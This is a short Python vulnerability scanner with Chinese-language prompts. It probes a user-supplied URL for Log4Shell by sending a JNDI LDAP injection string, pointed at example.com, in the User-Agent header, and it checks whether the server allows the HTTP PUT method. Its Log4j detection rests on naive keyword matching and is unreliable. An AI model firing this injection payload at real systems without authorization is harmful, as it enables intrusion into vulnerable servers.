import requests
import re

def check_log4j_vuln(url):
    try:
        headers = {'User-Agent': '${jndi:ldap://example.com/a}'}
        r = requests.get(url, headers=headers, timeout=5, verify=False)
        
        if 'log4j' in r.headers.get('X-Api-Version', '').lower():
            return True
            
        if re.search(r'log4j.*(vulnerable|exploit)', r.text, re.I):
            return True
            
    except Exception as e:
        pass
    return False

def check_http_methods(target):
    try:
        r = requests.options(target)
        if 'PUT' in r.headers.get('Allow','') or 'PUT' in r.headers.get('Public',''):
            print(f"[!] 危险HTTP方法允许: {r.headers.get('Allow','')}")
    except:
        pass

if __name__ == "__main__":
    target = input("输入目标URL: ")
    
    print("\n正在扫描Log4j漏洞...")
    if check_log4j_vuln(target):
        print(f"[!] 发现潜在Log4j漏洞 ({target})")
    
    print("\n检测HTTP方法配置...")
    check_http_methods(target)
    
    print("\n基础扫描完成")